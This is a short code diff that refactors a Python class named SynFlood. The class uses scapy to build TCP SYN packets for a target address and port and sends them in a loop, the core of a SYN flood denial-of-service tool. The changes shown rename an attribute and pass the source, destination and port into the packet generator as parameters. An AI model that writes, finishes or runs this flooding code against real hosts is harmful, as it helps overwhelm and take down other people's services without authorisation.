@@ -23,20 +23,20 @@ class SynFlood:
         self.__bound = bound
         self.__syn_counter = 0
         self.__src_ip = 'localhost'
-        self.__dst_ip, self.__dst_port = target
+        self.__dst_ip, self.__dport = target
     
     def __generate_syn(self, src_ip: str='localhost', dst_ip: str='localhost', dport: int=50000) -> scapy.packet:
         """
         Returns:
             scapy.packet: syn packet.
         """
-        return IP(src=self.__src_ip, dst=self.__dst_ip) / TCP(dport=self.__dst_port, flags=SYN_FLAG) 
+        return IP(src=src_ip, dst=dst_ip) / TCP(dport=dport, flags=SYN_FLAG) 
         
     def __send_syn(self, condition) -> None:
         """
         Sends a single syn packet to target.
         """ 
-        syn_packet = self.__generate_syn()
+        syn_packet = self.__generate_syn(self.__src_ip, self.__dst_ip, self.__dport)
         send(syn_packet, loop=condition)           
         self.__syn_counter += 1
         
